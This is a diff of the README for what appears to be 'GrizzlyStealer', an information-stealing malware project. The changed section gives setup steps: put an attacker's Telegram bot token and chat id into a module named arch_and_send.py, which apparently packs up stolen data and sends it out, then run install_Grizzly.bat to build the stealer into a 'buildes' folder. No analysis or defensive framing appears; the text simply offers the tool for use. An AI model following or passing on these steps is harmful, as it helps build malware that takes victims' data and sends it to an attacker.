@@ -63,17 +63,21 @@ Minuses:<br>
 ***
 
 
+https://github.com/K3rnel-Dev/GrizzlyStealer/assets/132711888/98bffc86-a60d-4ba9-84b5-7799c67bd407
+
+
+
 
                                           🖼️ How to use
 <div>
-
+<strong>
 1) Edit grizzlyModules/system/arch_and_send.py and replace token and chat id for your.<br>
              (@BotFather) - Create new bot and replace token for your bot<br>
              (@chatIDrobot) - Replace chatid for your telegram-id<br>
 2) Twice click on the mouse file, install_Grizzly.bat, <br>
 it automatically relies on python and automatically creates a build in the folder "buildes"<br>
 3) Your output build it will be in folder "buildes"<br>
-
+</strong>
 </div>
 
  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
